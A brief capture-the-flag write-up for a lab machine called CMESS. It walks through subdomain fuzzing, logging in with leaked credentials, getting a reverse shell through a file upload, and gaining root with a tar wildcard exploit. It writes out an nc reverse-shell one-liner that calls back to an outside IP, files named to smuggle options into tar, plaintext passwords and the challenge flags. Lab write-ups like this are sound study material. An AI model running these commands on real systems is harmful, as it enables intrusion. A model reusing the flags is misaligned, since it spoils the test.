# CMESS

## BASIC INFO
```
export IP=10.10.176.5

open port:
	22
	80

```

Looking at the hint for the first challenge, it says something about fuzzing subdomains. So we use wfuzz for fuzzing subdomains.
```
wfuzz -c -f subdomains.txt -w /opt/exploit/seclists/subdomains-5000.txt -u "http://cmess.thm" -H "Host: FUZZ.cmess.thm" --hw 290
```

Running the commands above we found a `dev.cmess.thm` subdomains. On that domain we acquire the username and password for login.

Navigate to $IP/admin
```
andre
KPFTN_f2yxe%
```

Once we're in as admin, let's try to upload file and get a reverse shell.

Now we're in as www-data. Go to `/opt/` and we can see a `.password.bak`
```
andre
UQfsdCB7aAP6
```

Switch to another user and see what we can do. There's a backup directory in his home and it says everything here will be backup. Maybe tar wildcard exploit?

```
echo "mkfifo /tmp/lhennp; nc 10.11.7.208 9001 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
tar cf archive.tar *
```

Then we set up a listener on our machine and wait for root shell.

> - **Compromise this machine and obtain user.txt**
>> thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}

> - **Escalate your privileges and obtain root.txt**
>> thm{9f85b7fdeb2cf96985bf5761a93546a2}